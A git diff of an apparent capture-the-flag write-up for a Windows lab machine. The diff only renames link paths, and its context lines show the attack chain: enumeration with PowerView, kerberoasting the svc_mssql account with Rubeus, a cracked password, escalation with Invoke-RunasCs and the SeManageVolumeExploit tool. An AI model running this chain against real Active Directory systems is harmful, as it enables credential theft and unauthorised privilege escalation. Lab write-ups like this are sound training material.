@@ -164,7 +164,7 @@ svc_apache               svc_mssql
 The command completed successfully.
 ```
 
-- We will also upload [PowerView.ps1](/1.Access/Sources/PowerView.ps1) to know about the target
+- We will also upload [PowerView.ps1](/1.Access/sources/PowerView.ps1) to know about the target
 
 ```pwsh
 PS C:\xampp\htdocs\uploads> Get-netuser svc_mssql
@@ -205,7 +205,7 @@ usnchanged                    : 73754
 ```
 
 - We can see that this account is configured with a **`serviceprincipalname`** or `SPN`. Armed with this information, we can perform a kerberoasting attack.
-- We will download and run [Rubeus.exe](/1.Access/Sources/Rubeus.exe)
+- We will download and run [Rubeus.exe](/1.Access/sources/Rubeus.exe)
 i got
 ```pwsh
 PS C:\xampp\htdocs\uploads> ./Rubeus.exe kerberoast /nowrap
@@ -242,7 +242,7 @@ PS C:\xampp\htdocs\uploads> ./Rubeus.exe kerberoast /nowrap
 
 - Let's copy the hash and save in out kali system as `mssql.hash` then try to decrypt it using hashcat.
 - We got the password as `trustno1`.
-- Now we will privelage escalate to `svc_mssql` using [Invoke-RunAsCs](/1.Access/Sources/PowerView.ps1)
+- Now we will privelage escalate to `svc_mssql` using [Invoke-RunAsCs](/1.Access/sources/PowerView.ps1)
     ```pwsh
     PS C:\xampp\htdocs\uploads> import-module ./Invoke-RunasCs.ps1
     import-module ./Invoke-RunasCs.ps1
@@ -282,7 +282,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
 PS C:\users\svc_mssql\Desktop>
 ```
 
-- We will use  [SeManageVolumeExploit.exe](/1.Access/Sources/SeManageVolumeExploit.exe) to exploit the Hard-disk of the target.
+- We will use  [SeManageVolumeExploit.exe](/1.Access/sources/SeManageVolumeExploit.exe) to exploit the Hard-disk of the target.
 ```pwsh
 PS C:\xampp\htdocs\uploads> ./SeManageVolumeExploit.exe
 ./SeManageVolumeExploit.exe
